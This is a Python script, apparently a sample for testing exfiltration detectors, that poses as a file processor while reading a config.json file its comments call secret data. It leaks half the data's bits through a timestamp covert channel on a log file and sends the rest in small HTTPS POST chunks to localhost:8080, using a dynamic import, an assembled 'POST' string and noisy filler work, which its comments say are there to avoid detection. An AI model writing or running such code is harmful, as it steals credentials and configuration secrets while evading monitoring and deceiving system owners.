import os
import time
import random
import json


class FileProcessor:
    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.work_dir = os.path.join(base_dir, "work")
        os.makedirs(self.work_dir, exist_ok=True)

    def _create_log_file(self):
        path = os.path.join(self.work_dir, "activity.log")
        with open(path, "w") as f:
            for _ in range(200):
                f.write(f"Log entry: {random.random()}\n")
        return path

    def _modify_timestamps(self, path, bits):
        base_time = time.time()
        for i, bit in enumerate(bits):
            offset = 0.001 if bit == "1" else 0.002
            ts = base_time + offset + i * 0.008
            os.utime(path, (ts, ts))
            time.sleep(0.009)

    def _small_network_call(self, data_chunk: bytes):
        # Dynamically import to avoid static detection
        import importlib

        http_module = importlib.import_module("http.client")
        conn = http_module.HTTPSConnection("localhost", 8080, timeout=2)
        headers = {"Content-Type": "application/octet-stream"}

        # Obfuscated method name to avoid obvious "post"
        method_name = "".join(["P", "O", "S", "T"])
        conn.request(method_name, "/upload", body=data_chunk, headers=headers)
        resp = conn.getresponse()
        # Read and ignore the response to avoid connection issues
        resp.read()
        conn.close()

    def process_all(self):
        """
        A large, noisy function mixing benign file ops, timestamp tweaks,
        and stealth network calls sending file data chunks in pieces.
        """
        # Step 1: create a noisy log file
        log_path = self._create_log_file()

        # Step 2: load secret data to send
        secret_path = os.path.join(self.base_dir, "config.json")
        try:
            with open(secret_path, "rb") as f:
                secret_data = f.read()
        except Exception:
            secret_data = b"{}"

        # Step 3: encode data to bits for timestamps
        bits = "".join(f"{byte:08b}" for byte in secret_data)

        # Step 4: timestamp encode first half of data bits
        half = len(bits) // 2
        self._modify_timestamps(log_path, bits[:half])

        # Step 5: small delay and some noisy work
        for _ in range(50):
            _ = random.random() * random.random()
            time.sleep(0.01)

        # Step 6: network send second half in small chunks
        chunk_size = 16
        for i in range(half, len(bits), chunk_size * 8):
            # Extract bits for this chunk
            chunk_bits = bits[i : i + chunk_size * 8]
            if not chunk_bits:
                break
            # Convert bits to bytes
            chunk_bytes = bytearray()
            for j in range(0, len(chunk_bits), 8):
                byte_bits = chunk_bits[j : j + 8]
                if len(byte_bits) < 8:
                    break
                chunk_bytes.append(int(byte_bits, 2))
            # Send chunk over HTTPS POST to localhost:8080/upload
            self._small_network_call(bytes(chunk_bytes))

        # Step 7: more noisy file writes and sleeps
        for _ in range(30):
            with open(log_path, "a") as f:
                f.write(f"Extra noise: {random.random()}\n")
            time.sleep(0.008)


def main():
    base = os.path.abspath(".")
    fp = FileProcessor(base)
    fp.process_all()
    print("Processing complete.")


if __name__ == "__main__":
    main()
